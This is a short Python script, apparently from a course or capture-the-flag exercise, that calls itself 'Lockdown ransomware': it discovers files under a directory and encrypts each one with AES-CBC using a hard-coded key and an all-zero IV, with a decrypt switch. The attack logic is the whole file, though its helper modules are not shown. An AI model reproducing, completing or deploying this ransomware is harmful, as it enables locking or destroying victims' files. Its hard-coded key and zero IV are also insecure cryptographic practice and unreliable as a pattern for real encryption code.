from Crypto.Cipher import AES
import argparse
import file_discover
import lockdown_crypto

"""
Utiliza a biblioteca AES do Python, que já tem o algoritmo implementado

encryption_key é a chave utilizada na criptografia (aqui utilizada com tamanho = 16 bits)

mode é o modo de criptografia utilizado, existem vários, mas o utilizado foi o CBC (cipher block chaining)

IV é o vetor de inicialização, que será utilizado para criptografar o primeiro bloco do block chain,
de maneira que esse primeiro bloco possa ser usado para criptografar o segundo bloco, e assim por diante

Mais detalhes https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_(CBC)
"""

encryption_key = 'disciplinagrc_19'
keysize = 16
mode = AES.MODE_CBC
IV = 16 * '\x00'



def get_parser():
    parser = argparse.ArgumentParser(description='Lockdown ransomware')
    parser.add_argument('-e', '--encrypt', help ='encrypt files [start in root directory]', action="store_true")
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]', action="store_true")

    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']
    encrypt = args['encrypt']

    if decrypt:
        decryptor = AES.new(encryption_key, mode, IV=IV)
        lockdown_crypto.decrypt_file('asd', decryptor, keysize)

    elif encrypt:
        encryptor = AES.new(encryption_key, mode, IV=IV)
        path = '/home/marcelo/hackaflag/Curitiba/prog'
        files = file_discover.discover(path)
        for i in files:
            lockdown_crypto.encrypt_file(i, encryptor, keysize)

    else:
        raise Exception("Wrong argument")


if __name__ == '__main__':
    main()
